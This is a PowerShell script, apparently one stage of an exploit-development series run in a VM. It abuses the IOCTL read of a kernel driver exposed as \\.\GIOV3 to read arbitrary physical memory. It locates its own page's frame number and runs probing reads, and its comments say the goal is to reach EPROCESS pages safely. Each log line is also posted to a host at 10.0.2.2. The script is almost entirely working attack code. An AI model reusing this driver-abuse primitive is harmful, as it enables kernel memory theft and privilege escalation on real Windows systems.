# p101_guest.ps1 -- what makes READ return 1450 for exactly one PA? (VM bench)
#
# p100: 12 of 13 PAs read clean from 1 MiB to 1 GiB, only pa=0x200000 returned 1450. Not a window,
# a per-page collision. p99 already proved a failed read leaves the destination untouched, so the
# failure is cheap. The dangerous version of this is: READ works except for pages already mapped in
# the *caller*, in which case we must never aim at our own landing buffer -- and an EPROCESS page
# could collide with whatever the driver has mapped.
#
# One question, four reads, both sides varied:
#   [1] own locked page's own PA, read into a *different* page   -> 1450? then "already mapped" is the rule
#   [2] the page after it, same destination                      -> ok? then it is the exact-PFN match
#   [3] pa=0x200000 into the *other* destination                 -> 1450 again? then source-side, not dst
#   [4] own PA again with the roles swapped                      -> confirms it follows the PA, not the buffer
$ErrorActionPreference = 'Continue'
trap { L ('EXC ' + $_.Exception.GetType().Name + ': ' + $_.Exception.Message + ' @L' + $_.InvocationInfo.ScriptLineNumber) ; continue }
$dir = 'C:\Users\Public\p37'
$out = Join-Path $dir '_p101_guest.txt'
$base = 'http://10.0.2.2:8080'
$IOCTL_READ = 0xC3502014L
$PAGE = 0x1000

function L([string]$m) {
    $line = (Get-Date -f 'HH:mm:ss') + '  ' + $m
    try { Add-Content -LiteralPath $out -Value $line -ErrorAction SilentlyContinue } catch { }
    Write-Output $line
    try { (New-Object Net.WebClient).UploadString("$base/log?vm=p101", $line) } catch { }
}
function Hex([byte[]]$b) { if (-not $b) { return '' } ; return (($b | ForEach-Object { $_.ToString('x2') }) -join '') }

if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
$VER = 'p101-v1'
$lock = Join-Path $dir '_p101.lock'
if (Test-Path -LiteralPath $lock) {
    $age = ((Get-Date) - (Get-Item -LiteralPath $lock).LastWriteTime).TotalSeconds
    if ($age -lt 45) { L ("skip $VER lock age=" + [int]$age) ; exit 0 }
}
Set-Content -LiteralPath $lock -Value (Get-Date -f 'HH:mm:ss') -Encoding ascii
L ("=== p101 guest-entry version=$VER")

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class P101 {
    [StructLayout(LayoutKind.Sequential)]
    public struct WSE { public IntPtr VA; public UInt64 Attr; }
    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string n, uint acc, uint share, IntPtr sa, uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr h, uint code, byte[] inb, uint inlen, byte[] outb, uint outlen, out uint ret, IntPtr ov);
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool VirtualLock(IntPtr p, uint n);
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint n, uint t, uint p);
    [DllImport("kernel32", SetLastError=true)]
    public static extern bool VirtualFree(IntPtr p, uint n, uint t);
    [DllImport("kernel32")]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("psapi", SetLastError=true)]
    public static extern bool QueryWorkingSetEx(IntPtr proc, [In, Out] WSE[] info, uint n);
}
'@ -ErrorAction SilentlyContinue

$me = [Diagnostics.Process]::GetCurrentProcess().Handle
$canary = New-Object byte[] $PAGE
for ($i = 0; $i -lt $PAGE; $i++) { $canary[$i] = [byte]($i -band 0xFF) }

$dA = [P101]::VirtualAlloc([IntPtr]::Zero, $PAGE, 0x3000, 0x04)
$dB = [P101]::VirtualAlloc([IntPtr]::Zero, $PAGE, 0x3000, 0x04)
[Runtime.InteropServices.Marshal]::Copy($canary, 0, $dA, $PAGE)
[Runtime.InteropServices.Marshal]::Copy($canary, 0, $dB, $PAGE)
[P101]::VirtualLock($dA, $PAGE) | Out-Null
[P101]::VirtualLock($dB, $PAGE) | Out-Null

$q = New-Object 'P101+WSE[]' 1
$q[0].VA = $dA
$q[0].Attr = 0
$qr = [P101]::QueryWorkingSetEx($me, $q, 1)
$valid = $q[0].Attr -band 1
$pfn = [uint64](($q[0].Attr -shr 32) -band 0xFFFFFFF)
$ownpa = [uint64]$pfn -shl 12
L ("=== p101 own page=0x{0:x} qok={1} valid={2} pfn=0x{3:x} pa=0x{4:x}" -f $dA.ToInt64(), [int]$qr, $valid, $pfn, $ownpa)
if (-not $valid -or -not $pfn) { L 'VERDICT: NO_PFN'; L ("VERDICT: P101_DONE " + (Get-Date -f 'yyyy-MM-dd HH:mm:ss')) ; exit 0 }

function DoRead([uint64]$pa, [IntPtr]$dst, [string]$tag) {
    $h = [P101]::CreateFileW('\\.\GIOV3', 0xC0000000L, 3, [IntPtr]::Zero, 3, 0, [IntPtr]::Zero)
    if (-not $h -or $h.ToInt64() -eq -1) { L ("  $tag open FAILED") ; return -1 }
    [Runtime.InteropServices.Marshal]::Copy($canary, 0, $dst, $PAGE)
    $ib = New-Object byte[] 24
    [Array]::Copy([BitConverter]::GetBytes($pa), 0, $ib, 0, 8)
    [Array]::Copy([BitConverter]::GetBytes([uint32]$PAGE), 0, $ib, 8, 4)
    [Array]::Copy([BitConverter]::GetBytes([uint64]$dst.ToInt64()), 0, $ib, 16, 8)
    $ob = New-Object byte[] $PAGE
    $got = [uint32]0
    $ok = [P101]::DeviceIoControl($h, $IOCTL_READ, $ib, [uint32]$ib.Length, $ob, [uint32]$ob.Length, [ref]$got, [IntPtr]::Zero)
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    [P101]::CloseHandle($h) | Out-Null
    $back = New-Object byte[] $PAGE
    [Runtime.InteropServices.Marshal]::Copy($dst, $back, 0, $PAGE)
    $d = 0
    for ($i = 0; $i -lt $PAGE; $i++) { if ($back[$i] -ne $canary[$i]) { $d++ } }
    L ("  {0} pa=0x{1:x} dst=0x{2:x} ok={3} err={4} diff={5} head={6}" -f $tag, $pa, $dst.ToInt64(), [int]$ok, [int]$err, $d, (Hex ($back[0..15])))
    if ($ok -and $d -gt 0) { return 1 }
    if ($err -eq 1450) { return -2 }
    return 0
}

$r1 = DoRead $ownpa $dB 'r1_own'
Start-Sleep -Milliseconds 150
$r2 = DoRead ($ownpa + 0x1000) $dB 'r2_next'
Start-Sleep -Milliseconds 150
$r3 = DoRead 0x200000 $dA 'r3_2mb'
Start-Sleep -Milliseconds 150
$r4 = DoRead $ownpa $dA 'r4_own_swapped'

L ("RESULT r1={0} r2={1} r3={2} r4={3}" -f $r1, $r2, $r3, $r4)
if ($r1 -eq -2 -and $r2 -eq 1) { L 'VERDICT: SELF_MAP_COLLISION' }
elseif ($r1 -eq -2 -and $r2 -eq -2) { L 'VERDICT: ADJACENT_FAULT_BLOCK' }
elseif ($r1 -eq 1) { L 'VERDICT: OWN_PAGE_READABLE' }
else { L 'VERDICT: INCONCLUSIVE' }
if ($r3 -eq -2 -and $r4 -eq -2) { L 'NOTE: 1450 follows the PA, not the destination buffer' }
L ("VERDICT: P101_DONE " + (Get-Date -f 'yyyy-MM-dd HH:mm:ss'))
[P101]::VirtualFree($dA, 0, 0x8000) | Out-Null
[P101]::VirtualFree($dB, 0, 0x8000) | Out-Null


